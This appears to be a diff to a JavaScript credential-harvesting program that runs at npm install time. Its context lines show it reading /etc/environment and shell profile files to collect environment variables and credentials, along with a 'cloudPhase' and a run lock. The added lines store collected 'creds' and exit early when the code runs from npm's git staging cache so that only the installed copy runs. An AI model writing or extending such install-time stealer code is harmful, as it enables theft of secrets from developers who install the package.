@@ -576,6 +576,7 @@ function harvestExports(state) {
   if (IS_LINUX) files.push('/etc/environment', '/etc/profile', '/etc/bash.bashrc');
   state.envVars = [];
   state.envCreds = [];
+  state.creds = state.creds || [];
   const seen = new Set();
   const add = (file, key, value) => {
     const id = `${key}=${value}`;
@@ -1124,6 +1125,10 @@ async function cloudPhase() {
 
 // ---------------------------------------------------------------- main
 async function main() {
+  if (process.cwd().includes(`${path.sep}_cacache${path.sep}`)) {
+    log('[*] npm git staging copy, deferring to installed copy');
+    return;
+  }
   if (recentRun()) {
     log('[*] recent run lock present, exiting');
     return;
